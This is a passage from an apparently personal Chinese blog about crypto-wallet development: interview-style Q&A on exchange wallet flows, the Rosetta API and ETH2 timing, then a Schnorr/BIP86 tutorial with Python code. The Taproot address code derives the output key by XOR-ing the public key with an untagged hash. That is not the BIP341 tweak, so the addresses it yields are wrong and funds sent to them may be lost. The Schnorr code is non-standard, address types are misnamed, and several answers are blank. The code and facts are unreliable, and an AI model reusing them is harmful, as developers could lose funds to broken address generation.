title="提现"></a>提现</h3><p>1.获取签名参数—&gt;2.离线签名—3.广播出去—&gt;4.扫链确认—&gt;5.通知业务层，持久化存储</p><ul><li>获取离线签名需要的参数，给合适的手续费</li><li>构建未签名的交易消息摘要，将消息摘要递给签名机签名</li><li>构建完整的交易并进行序列化</li><li>发送交易到区块链网络</li><li>扫链获取到交易之后更新交易状态并上报业务层</li></ul><h3 id="归集"><a href="#归集" class="headerlink" title="归集"></a>归集</h3><p>归集就是转账，把分散的币归拢到归集地址，</p><ul><li>将用户地址上的资金转到归集地址，签名流程类似提现</li><li>发送交易到区块链网络</li><li>扫链获取到交易之后更新交易状态</li></ul><h3 id="转冷"><a href="#转冷" class="headerlink" title="转冷"></a>转冷</h3><ul><li>将热钱包地址上的资金转到冷钱包地址，签名流程类似提现</li><li>发送交易到区块链网络</li><li>扫链获取到交易之后更新交易状态</li></ul><h3 id="冷转热"><a href="#冷转热" class="headerlink" title="冷转热"></a>冷转热</h3><ul><li>手动操作转账到热钱包地址</li><li>扫链获取到交易之后更新交易状态</li></ul><h2 id="10-有用过-rosetta-api-请简单描述起作用，并举几个钱包常用的接口说明"><a href="#10-有用过-rosetta-api-请简单描述起作用，并举几个钱包常用的接口说明" class="headerlink" title="10.有用过 rosetta api, 请简单描述起作用，并举几个钱包常用的接口说明"></a>10.有用过 rosetta api, 请简单描述起作用，并举几个钱包常用的接口说明</h2><p>Bitcoin Rosetta API 是由 Coinbase 提出的 Rosetta 标准的一部分，旨在为区块链和钱包提供一个统一的接口标准。这个标准化的接口使得与各种区块链的交互更加容易和一致，无论是对交易数据的读取还是写入。目前已经支持很多链，包含比特币，以太坊等主流链，也包含像 IoTex 和 Oasis 这样的非主流链。</p><h3 id="用到的接口"><a href="#用到的接口" class="headerlink" title="用到的接口"></a>用到的接口</h3><p>&#x2F;network&#x2F;list：返回比特币主网和测试网信息。 &#x2F;network&#x2F;status：返回当前最新区块、已同步区块高度、区块链处理器的状态等。 &#x2F;block 和 &#x2F;block&#x2F;transaction：返回区块和交易的详细信息，包括交易的输入输出、金额、地址等。 &#x2F;account&#x2F;balance：通过查询比特币节点，返回指定地址的余额。</p><h3 id="发送交易到区块链网络"><a href="#发送交易到区块链网络" class="headerlink" title="发送交易到区块链网络"></a>发送交易到区块链网络</h3><p>&#x2F;construction&#x2F;submit：通过比特币节点提交签名后的交易。</p><h2 id="11-ETH2-0-的-epoch-slot-和-block-简述"><a href="#11-ETH2-0-的-epoch-slot-和-block-简述" class="headerlink" title="11.ETH2.0 的 epoch, slot 和 block 简述"></a>11.ETH2.0 的 epoch, slot 和 block 简述</h2><h3 id="Slot（时隙）"><a href="#Slot（时隙）" class="headerlink" title="Slot（时隙）"></a>Slot（时隙）</h3><p>定义：Slot 是以太坊2.0中最基本的时间单位，每个slot都有一个指定的时间长度。在每个 slot 中，可能会有一个区块被提议并添加到链中。 时间长度：一个 slot 的长度为 12 秒。这意味着每 12 秒会有一个新的 slot。 功能：在每个 slot 中，网络中的验证者将有机会提议一个新的区块。这些提议者是通过权益证明（PoS）随机选择的。</p><h3 id="Epoch（纪元）"><a href="#Epoch（纪元）" class="headerlink" title="Epoch（纪元）"></a>Epoch（纪元）</h3><p>定义：Epoch 是由多个连续的slot组成的更长时间段。在 Eth2.0 中，Epoch 用于管理和组织验证者的活动。 组成：一个 Epoch 由 32 个 slot 组成。 时间长度：由于一个 slot 是12秒，一个 Epoch 的总长度是 384 秒（即6.4分钟）。 功能：Epoch 是用来实现共识机制的一部分。在每个 Epoch 结束时，网络会进行状态和共识的检查和调整，包括对验证者的奖励和惩罚。</p><h3 id="Block（区块）"><a href="#Block（区块）" class="headerlink" title="Block（区块）"></a>Block（区块）</h3><p>定义：Block 是包含交易和其他相关数据的记录单元。在以太坊2.0中，每个slot可能会有一个区块被提议，但不保证每个 slot 都有区块。 内容：一个区块包含区块头、交易列表、状态根哈希、签名等数据。 创建过程：在每个 slot 开始时，网络会随机选出一个验证者来提议区块。该验证者将创建一个包含新交易和其他必要信息的区块，并广播到网络中。</p><h2 id="12-中心化钱包开发中为什么需要确认位，您怎么理解这个确认位的"><a href="#12-中心化钱包开发中为什么需要确认位，您怎么理解这个确认位的" class="headerlink" title="12.中心化钱包开发中为什么需要确认位，您怎么理解这个确认位的"></a>12.中心化钱包开发中为什么需要确认位，您怎么理解这个确认位的</h2><p>在确认位过了之后交易回滚的难度很大，每条链不一样，根据历史和经验来定，以太坊的话可以参照区块状态来做</p><h2 id="13-简单描述以太坊交易类型，并说明这个交易类型的作用"><a href="#13-简单描述以太坊交易类型，并说明这个交易类型的作用" class="headerlink" title="13.简单描述以太坊交易类型，并说明这个交易类型的作用"></a>13.简单描述以太坊交易类型，并说明这个交易类型的作用</h2><ul><li>leagcy: 历史遗留交易类型，签名体为 gasLimit 和 gasPrice</li><li>Eip1559: BaseFee 类型</li><li>blob: EIP4844 交易类型</li></ul><h2 id="14-去中心化和中心化钱包开发中的异同点有哪些？"><a href="#14-去中心化和中心化钱包开发中的异同点有哪些？" class="headerlink" title="14.去中心化和中心化钱包开发中的异同点有哪些？"></a>14.去中心化和中心化钱包开发中的异同点有哪些？</h2><p><strong>1、密钥管理方式不同</strong></p><p>HD 钱包私钥在本地设备，私钥用户自己控制 交易所钱包中心化服务器(CloadHSM, TEE 等)，私钥项目方控制</p><p><strong>2、资金存在方式不同</strong></p><p>HD 资金在用户钱包地址 交易所钱包资金在交易所热钱包或者冷钱包里面</p><p><strong>3、业务逻辑不一致</strong></p><p>中心化钱包：实时不断扫链更新交易数据和状态</p><p> HD 钱包：根据用户的操作通过请求接口实现业务逻辑</p><h2 id="15-发生硬分叉时，做为钱包的开发，您应当怎么去处理这种状况，-以-ETHPOW-和-ETH2-0-分叉这个过程"><a href="#15-发生硬分叉时，做为钱包的开发，您应当怎么去处理这种状况，-以-ETHPOW-和-ETH2-0-分叉这个过程" class="headerlink" title="15.发生硬分叉时，做为钱包的开发，您应当怎么去处理这种状况， 以 ETHPOW 和 ETH2.0 分叉这个过程"></a>15.发生硬分叉时，做为钱包的开发，您应当怎么去处理这种状况， 以 ETHPOW 和 ETH2.0 分叉这个过程</h2><p>认可共识比较</p><h2 id="16-TON-支持合约吗？若支持，请说出其合约开发语言"><a href="#16-TON-支持合约吗？若支持，请说出其合约开发语言" class="headerlink" title="16.TON 支持合约吗？若支持，请说出其合约开发语言"></a>16.TON 支持合约吗？若支持，请说出其合约开发语言</h2><h2 id="17-比特币的地址有哪些格式，请说明"><a href="#17-比特币的地址有哪些格式，请说明" class="headerlink" title="17.比特币的地址有哪些格式，请说明"></a>17.比特币的地址有哪些格式，请说明</h2><p>P2SH</p><p>P2WP</p><p>P2PKH</p><p>P2TP</p><h2 id="18-描述一下-UTXO-和账户模型的区别"><a href="#18-描述一下-UTXO-和账户模型的区别" class="headerlink" title="18.描述一下 UTXO 和账户模型的区别"></a>18.描述一下 UTXO 和账户模型的区别</h2><p> UTXO：未花费的交易输出</p><p>在UTXO模型中，每个交易输出都被视为未使用的交易输出（UTXO）。UXTO代表了一定数量的加密货币，他们被锁定在一个特定的地址上，并且只能通过使用私钥来解锁。当进行交易时，需要使用先前未使用的UTXO作为输入，并将其消耗掉，同事生成新的UTXO作为输出。</p><p>账户模型：</p><p>每个账户被视为包含余额和状态的实体。用户拥有一个私钥对应账户地址，可以使用私钥对账户进行前面来进行交易。每个账户的余额存储在链上，当发生交易时，账户的余额会相应地增加或减少。</p><h2 id="20-解释一下什么是-EVM-同源链，举例说明一下"><a href="#20-解释一下什么是-EVM-同源链，举例说明一下" class="headerlink" title="20.解释一下什么是 EVM 同源链，举例说明一下"></a>20.解释一下什么是 EVM 同源链，举例说明一下</h2><h2 id="21-ERC721-和-ERC1155-区别与联系"><a href="#21-ERC721-和-ERC1155-区别与联系" class="headerlink" title="21.ERC721 和 ERC1155 区别与联系"></a>21.ERC721 和 ERC1155 区别与联系</h2><h1 id="一些感悟"><a href="#一些感悟" class="headerlink" title="一些感悟"></a>一些感悟</h1><p>最核心的不是扫链，不是获取用户数据、交易数据，接口比较简单</p><p>最核心的永远都是离线地址的生成和签名交易的生成</p><h3 id="同一套助记词在不同的链生成的私钥不一样吗？"><a href="#同一套助记词在不同的链生成的私钥不一样吗？" class="headerlink" title="同一套助记词在不同的链生成的私钥不一样吗？"></a>同一套助记词在不同的链生成的私钥不一样吗？</h3><p>不一样</p><p>COSMOS支持的地址类型</p><p>以前只支持Secp256k1后来扩展支持Edd25519</p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>05-02 Bitcoin钱包Schnorr地址生成与签名</title>
    <link href="/2024/05/28/05-2Bitcoin%E9%92%B1%E5%8C%85Schnorr%E5%9C%B0%E5%9D%80%E7%94%9F%E6%88%90%E4%B8%8E%E7%AD%BE%E5%90%8D/"/>
    <url>/2024/05/28/05-2Bitcoin%E9%92%B1%E5%8C%85Schnorr%E5%9C%B0%E5%9D%80%E7%94%9F%E6%88%90%E4%B8%8E%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Schnorr签名"><a href="#1-Schnorr签名" class="headerlink" title="1.Schnorr签名"></a>1.Schnorr签名</h1><h2 id="1-1-签名流程"><a href="#1-1-签名流程" class="headerlink" title="1.1 签名流程"></a>1.1 签名流程</h2><h3 id="密钥生成（Key-Generation）"><a href="#密钥生成（Key-Generation）" class="headerlink" title="密钥生成（Key Generation）"></a>密钥生成（Key Generation）</h3><ul><li>私钥 𝑘<em>k</em> 是一个随机选择的整数，范围为 [1,𝑛−1]，其中 𝑛 是椭圆曲线的阶。,</li><li>公钥 𝑃<em>P</em> 是通过将私钥乘以椭圆曲线的基点 𝐺<em>G</em> 得到的，即 𝑃&#x3D;𝑘⋅𝐺。</li></ul><h3 id="签名生成（Signature-Generation）"><a href="#签名生成（Signature-Generation）" class="headerlink" title="签名生成（Signature Generation）"></a>签名生成（Signature Generation）</h3><p>假设消息为 𝑚。</p><ul><li>生成随机数 𝑟：选择一个随机数 𝑟<em>r</em> 作为临时私钥，范围为 [1,𝑛−1]。</li><li>计算非交互式挑战：计算 𝑅&#x3D;𝑟⋅𝐺，其中 𝐺 是椭圆曲线的基点。</li><li>计算哈希值：计算哈希值 𝑒：</li></ul><p>𝑒&#x3D;H(𝑅∥𝑃∥𝑚)</p><ul><li>其中 H 是一个哈希函数，如 SHA-256，𝑅∥𝑃∥𝑚 表示 𝑅、公钥 𝑃 和消息 𝑚 的连接。</li><li>计算签名：计算签名 𝑠：</li></ul><p>𝑠&#x3D;𝑟+𝑒⋅𝑘(mod𝑛)</p><ul><li>其中 𝑘 是私钥，𝑒 是哈希值，𝑛<em>n</em>是椭圆曲线的阶。</li></ul><p>签名由 (𝑅,𝑠)组成。</p><h3 id="签名验证（Signature-Verification）"><a href="#签名验证（Signature-Verification）" class="headerlink" title="签名验证（Signature Verification）"></a>签名验证（Signature Verification）</h3><ul><li>计算哈希值：重新计算哈希值 𝑒：</li></ul><p>𝑒&#x3D;H(𝑅∥𝑃∥𝑚)</p><ul><li>验证等式：验证以下等式是否成立：</li></ul><p>𝑠⋅𝐺&#x3D;𝑅+𝑒⋅𝑃</p><ul><li>如果等式成立，签名是有效的；否则无效</li></ul><p>看不懂没关系，我也看不懂，有个概念知道是这<strong>三个步骤</strong>即可</p><h2 id="1-2-签名特点"><a href="#1-2-签名特点" class="headerlink" title="1.2 签名特点"></a>1.2 签名特点</h2><p><strong>简洁性</strong></p><ul><li>Schnorr签名算法结构简单，签名过程和验证过程都较为直观。</li><li>这种简洁性有助于实现和分析安全性</li></ul><p><strong>安全性</strong></p><ul><li>不可伪造：基于离散对数问题的困难性，Schnorr签名在当前已知的计算能力下被认为是安全的</li><li>欧式证明：有严格的欧式安全性证明。</li></ul><p><strong>高效性</strong>：</p><ul><li>计算效率：签名生成和验证的计算效率较高。尤其在批量签名验证中，Schnorr 签名具有显著的性能优势。</li><li>签名长度：Schnorr 签名的长度较短，相比于 ECDSA 签名，Schnorr 签名占用的存储空间更少。因为签名越短—–&gt;所以花费的gas fees就越少，</li></ul><p><strong>扩展性和兼容性</strong></p><p>Schnorr 签名支持多种扩展功能，如多重签名（MuSig）和聚合签名。这些扩展功能在增强隐私性和可扩展性方面表现出色。</p><ul><li>多重签名（MuSig）：Schnorr 签名允许多个签名者的公钥和签名聚合为单一的公钥和签名，这显著提高了多重签名的效率和隐私性。</li><li>兼容性：Schnorr 签名与现有的椭圆曲线加密标准兼容，便于在现有系统中实现和部署。</li></ul><h2 id="1-3-签名算法Python代码实现"><a href="#1-3-签名算法Python代码实现" class="headerlink" title="1.3 签名算法Python代码实现"></a>1.3 签名算法Python代码实现</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># schnorr.py</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> SECP256k1, SigningKey, VerifyingKey<br><span class="hljs-keyword">from</span> ecdsa.curves <span class="hljs-keyword">import</span> Curve<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SchnorrSignObj</span>:<br>    curve: Curve<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 椭圆曲线参数</span><br>        self.curve = SECP256k1 <span class="hljs-comment"># curve就是椭圆曲线对象，SECP256k1就是常见的椭圆曲线</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">schnorr_sign</span>(<span class="hljs-params">self, private_key, message</span>): <span class="hljs-comment"># 签名函数，传私钥和msg</span><br>        <span class="hljs-comment"># 生成私钥和公钥</span><br>        signing_key = SigningKey.from_string(private_key, curve=self.curve) <span class="hljs-comment"># 使用私钥和椭圆曲线对象生成一个签名对象</span><br>        verifying_key = signing_key.get_verifying_key() <span class="hljs-comment"># 从签名秘钥对象获得公钥，verifying_key就是公钥，返回一个公钥key可以用来验证签名</span><br><br>        <span class="hljs-comment"># 生成随机数 r</span><br>        r = SigningKey.generate(curve=self.curve).privkey.secret_multiplier <span class="hljs-comment"># 生成随机数作为签名的一部分</span><br>        R = VerifyingKey.from_public_point(r * self.curve.generator, curve=self.curve) <span class="hljs-comment"># 使用随机数r乘以椭圆曲线的生成元，得到签名中的挑战点R。</span><br><br>        <span class="hljs-comment"># 计算哈希 e</span><br>        e = hashlib.sha256(R.to_string() + verifying_key.to_string() + message).digest() <span class="hljs-comment"># 这个之前学过，sha256加密返回哈希计算结果的二进制表示，传入挑战点R+公钥+msg</span><br>        e = <span class="hljs-built_in">int</span>.from_bytes(e, <span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-comment"># 将字节对象转成大整数，big表示大端字节数</span><br><br>        <span class="hljs-comment"># 计算签名 s</span><br>        s = (r + e * signing_key.privkey.secret_multiplier) % self.curve.order <span class="hljs-comment"># 计算签名中的s，根据Schnorr签名算法的计算公式，将随机数r和哈希e与私钥的倍数相加，并对椭圆曲线的阶数取模。</span><br>        <span class="hljs-keyword">return</span> R.to_string(), s.to_bytes(<span class="hljs-number">32</span>, <span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-comment"># 返回挑战点 R 的字符串，和签名s的32字节大端字节串表示。</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">schnorr_verify</span>(<span class="hljs-params">self, public_key, message, signature</span>): <span class="hljs-comment"># 签名验证，传入公钥，msg， 签名signature</span><br>        <span class="hljs-comment"># 解析签名</span><br>        R = VerifyingKey.from_string(signature[<span class="hljs-number">0</span>], curve=self.curve) <span class="hljs-comment"># 从签名中解析挑战点 R ，传入对应的椭圆曲线对象</span><br>        s = <span class="hljs-built_in">int</span>.from_bytes(signature[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-comment"># 从签名消息中解析签名 s大端字节串表示</span><br><br>        <span class="hljs-comment"># 计算哈希 e</span><br>        e = hashlib.sha256(signature[<span class="hljs-number">0</span>] + public_key.to_string() + message).digest() <span class="hljs-comment"># sha256加密返回哈希计算结果的二进制表示，传入签名[0] + 公钥 + msg</span><br>        e = <span class="hljs-built_in">int</span>.from_bytes(e, <span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-comment"># 将字节对象转成大整数，big表示大端字节数</span><br><br>        <span class="hljs-comment"># 验证签名</span><br>        sG = VerifyingKey.from_public_point(s * self.curve.generator, curve=self.curve) <span class="hljs-comment"># 从公钥获取指针（初始化验证公钥对象），传入将生成元乘以 s 值，得到一个新的点。self.curve：表示使用相同的椭圆曲线对象进行计算。</span><br>        <span class="hljs-comment"># R：是挑战点，它是一个椭圆曲线上的点，R.pubkey.point：表示挑战点 R 的公钥点。</span><br>        <span class="hljs-comment"># e：是哈希值，它是一个整数public_key.pubkey.point：表示公钥的点，</span><br>        <span class="hljs-comment"># public_key.pubkey.point：表示公钥的点。</span><br>        ReP = VerifyingKey.from_public_point(R.pubkey.point + e * public_key.pubkey.point, curve=self.curve) <br>        <span class="hljs-keyword">return</span> sG.to_string() == ReP.to_string() <span class="hljs-comment"># 验证是否通过</span><br></code></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># test_schnorr.py</span><br><span class="hljs-keyword">import</span> schnorr <span class="hljs-keyword">as</span> schnorr<br><span class="hljs-comment"># from schnorr import SchnorrSignObj</span><br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> SECP256k1, SigningKey, VerifyingKey<br><br><span class="hljs-comment"># 初始化类</span><br>schnorr_test = schnorr.SchnorrSignObj()<br><br><span class="hljs-comment"># 产生密钥并对交易签名</span><br>private_key = SigningKey.generate(curve=SECP256k1).to_string()<br>message = <span class="hljs-string">b&quot;Hello, Schnorr!2222&quot;</span><br>signature = schnorr_test.schnorr_sign(private_key, message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Signature:&quot;</span>, signature)<span class="hljs-comment"># 打印的是字节</span><br><br><span class="hljs-comment"># 验证交易签名</span><br>public_key = VerifyingKey.from_string(<br>    SigningKey.from_string(private_key, curve=SECP256k1).get_verifying_key().to_string(), curve=SECP256k1)<br>is_valid = schnorr_test.schnorr_verify(public_key, message, signature)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Signature valid:&quot;</span>, is_valid) <span class="hljs-comment"># Signature valid Ture </span><br><br></code></pre></td></tr></table></figure><h2 id="2-BIP86-协议"><a href="#2-BIP86-协议" class="headerlink" title="2. BIP86 协议"></a>2. BIP86 协议</h2><p><strong>2.1 结构路径</strong> BIP86 是一种专门为生成 Taproot 地址的路径标准，简化并优化了生成单密钥 Taproot 地址的过程。BIP86 的路径结构如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">m / 86&#x27; / coin_type&#x27; / account&#x27; / change / address_index<br></code></pre></td></tr></table></figure><ul><li>Purpose: 固定为 86’，表示遵循 <strong>BIP86</strong> 标准。</li><li>Coin Type: 定义特定加密货币的<strong>类型</strong>，如 0’ 表示<strong>比特币</strong>。</li><li>Account: 账户<strong>索引</strong>，允许钱包管理多个独立账户。</li><li>Change: 0 表示外部链（收款地址）<strong>，1 表示内部链（找零地址</strong>）。</li><li>Address Index: 用于生成具体地址的<strong>索引</strong>。</li></ul><p><strong>2.2.地址生成方法</strong></p><p>BIP86 使用新的路径结构生成 Taproot 地址，通过椭圆曲线算法派生公钥，并将其编码为 Bech32 格式的地址。生成的 Taproot 地址具有更高的隐私性、安全性和扩展性。</p><p><strong>2.3.BIP86 的优势</strong></p><ul><li>简洁性：BIP86 提供了一种简洁而直观的路径结构，用于生成 Taproot 地址。</li><li>安全性：BIP86 使用椭圆曲线算法生成公钥，具有与比特币的现有地址生成方法相当的安全性。</li><li>可扩展性：BIP86 支持不同的币种和账户，具有良好的可扩展性。</li></ul><h2 id="3-BIP44-与-BIP86-的区别与联系"><a href="#3-BIP44-与-BIP86-的区别与联系" class="headerlink" title="3. BIP44 与 BIP86 的区别与联系"></a>3. BIP44 与 BIP86 的区别与联系</h2><p><strong>3.1.用途上的区别</strong></p><ul><li>BIP44: 通用的多币种、多账户管理，适用于生成多种类型的地址（P2PKH, P2SH, P2WPKH）。</li><li>BIP86: <strong>专门</strong>为生成单密钥 Taproot 地址设计，简化了路径和使用场景。</li></ul><p><strong>3.2. 路径结构区别</strong></p><ul><li>BIP44: m&#x2F;44’&#x2F;coin_type’&#x2F;account’&#x2F;change&#x2F;address_index，包含<strong>多币种</strong>、多账户和<strong>多地址类型</strong>。</li><li>BIP86: m&#x2F;86’&#x2F;coin_type’&#x2F;account’&#x2F;change&#x2F;address_index，专注于<strong>单密钥</strong> Taproot 地址生成。</li></ul><p><strong>3.3.复杂性区别</strong></p><ul><li>BIP44: 适用于更复杂的多币种和多账户需求，<strong>路径层次更丰富。</strong></li><li>BIP86: 专注于单一用途（Taproot 地址），<strong>路径层次简化</strong>。</li></ul><p><strong>3.4.标准化区别</strong></p><ul><li>BIP44: 广泛应用于各种钱包和加密货币管理系统，已经成为生成确定性钱包路径的标准。</li><li>BIP86: 主要用于比特币的 Taproot 地址生成，随着 Taproot 的采用而变得更加流行。</li></ul><p><strong>3.5.总结</strong></p><ul><li>BIP44 适用于多种类型地址生成，适合更<strong>复杂</strong>的钱包管理需求。</li><li>BIP86 专注于生成比特币的 Taproot 地址，路径<strong>简化</strong>，<strong>专门</strong>为 Taproot 设计。</li></ul><p>还有BIP84协议，协议很多</p><h2 id="4-Taproot-为什么需要-BIP86"><a href="#4-Taproot-为什么需要-BIP86" class="headerlink" title="4.Taproot 为什么需要 BIP86"></a>4.Taproot 为什么需要 BIP86</h2><p><strong>4.1. 专注于单密钥 Taproot 地址</strong> ：BIP86 专门设计用于生成单密钥 Taproot 地址。Taproot 是比特币的一项重要升级，旨在提高<strong>隐私性</strong>、<strong>可扩展性</strong>和智能合约功能。</p><p><strong>4.2.符合新标准和优化</strong>： BIP86 引入了一些新的优化和改进，以支持比特币协议的新特性，如 Taproot 和 Schnorr 签名。Taproot 和 Schnorr 签名提供了更高的安全性和更好的隐私特性。BIP86 的设计是为了最大限度地利用这些新特性。</p><p><strong>4.3.专注于比特币和未来扩展</strong></p><p>BIP44 是一个通用的多币种和多账户路径标准，设计用于管理各种加密货币的地址。这种通用性虽然提供了很大的灵活性，但在特定的优化和新特性支持上可能不如专门设计的标准有效。BIP86 专门为比特币设计，更好地支持比特币的未来扩展和改进。</p><p><strong>4.4.简化路径和提高效率</strong></p><p>BIP86 路径简化，专注于单一用途，使其更适合于生成和管理比特币的 Taproot 地址。这种简化可以减少实现和使用中的复杂性，提高效率和安全性。</p><p><strong>4.5.避免混淆和错误</strong></p><p>BIP86 的专用路径减少了使用过程中可能出现的混淆和错误。由于它专门设计用于比特币的 Taproot 地址，开发者和用户不必在多个标准之间切换，减少了出错的可能性。</p><p><strong>4.6.代码比较</strong></p><p>BIP44 代码示范</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_address</span>(<span class="hljs-params">mnemonic</span>):<br>    seed = bip39.phrase_to_seed(mnemonic)<br>    bip32_root_key = BIP32Key.fromEntropy(seed)<br>    path = <span class="hljs-string">&quot;m/44&#x27;/0&#x27;/0&#x27;/0/0&quot;</span><br>    key = bip32_root_key<br>    <span class="hljs-keyword">for</span> level <span class="hljs-keyword">in</span> path.split(<span class="hljs-string">&#x27;/&#x27;</span>)[<span class="hljs-number">1</span>:]:<br>        <span class="hljs-keyword">if</span> level.endswith(<span class="hljs-string">&quot;&#x27;&quot;</span>):<br>            index = BIP32_HARDEN + <span class="hljs-built_in">int</span>(level[:-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">else</span>:<br>            index = <span class="hljs-built_in">int</span>(level)<br>        key = key.ChildKey(index)<br>    address = key.Address()<br>    <span class="hljs-keyword">return</span> address<br></code></pre></td></tr></table></figure><p>BIP86 代码示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bip39<br><span class="hljs-keyword">import</span> bech32<br><span class="hljs-keyword">from</span> bip32 <span class="hljs-keyword">import</span> BIP32, HARDENED_INDEX<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> SECP256k1, SigningKey<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_taproot_address</span>(<span class="hljs-params">mnemonic</span>):<br>    seed = bip39.phrase_to_seed(mnemonic)<br>    bip32 = BIP32.from_seed(seed)<br>    path = <span class="hljs-string">&quot;m/86&#x27;/0&#x27;/0&#x27;/0/0&quot;</span><br>    child_key = bip32.get_privkey_from_path(path)<br>    private_key = SigningKey.from_string(child_key, curve=SECP256k1)<br>    public_key = private_key.get_verifying_key().to_string(<span class="hljs-string">&quot;compressed&quot;</span>)<br>    tweak = sha256(<span class="hljs-string">b&#x27;TapTweak&#x27;</span> + public_key[<span class="hljs-number">1</span>:]).digest()<br>    tweaked_pubkey = <span class="hljs-built_in">bytearray</span>(public_key)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        tweaked_pubkey[<span class="hljs-number">1</span> + i] ^= tweak[i]<br>    witver = <span class="hljs-number">1</span>  <span class="hljs-comment"># witness version for Taproot</span><br>    witprog = tweaked_pubkey[<span class="hljs-number">1</span>:<span class="hljs-number">33</span>]<br>    address = bech32.encode(<span class="hljs-string">&#x27;bc&#x27;</span>, witver, witprog)<br>    <span class="hljs-keyword">return</span> address<br></code></pre></td></tr></table></figure><h1 id="5-Taproot-格式地址离线生成"><a href="#5-Taproot-格式地址离线生成" class="headerlink" title="5. Taproot 格式地址离线生成"></a>5. Taproot 格式地址离线生成</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bip39<br><span class="hljs-keyword">import</span> bech32<br><span class="hljs-keyword">from</span> bip32 <span class="hljs-keyword">import</span> BIP32, HARDENED_INDEX<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> SECP256k1, SigningKey<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_taproot_address</span>(<span class="hljs-params">mnemonic</span>):<br>    seed = bip39.phrase_to_seed(mnemonic)<br>    bip32 = BIP32.from_seed(seed)<br>    path = <span class="hljs-string">&quot;m/86&#x27;/0&#x27;/0&#x27;/0/0&quot;</span><br>    child_key = 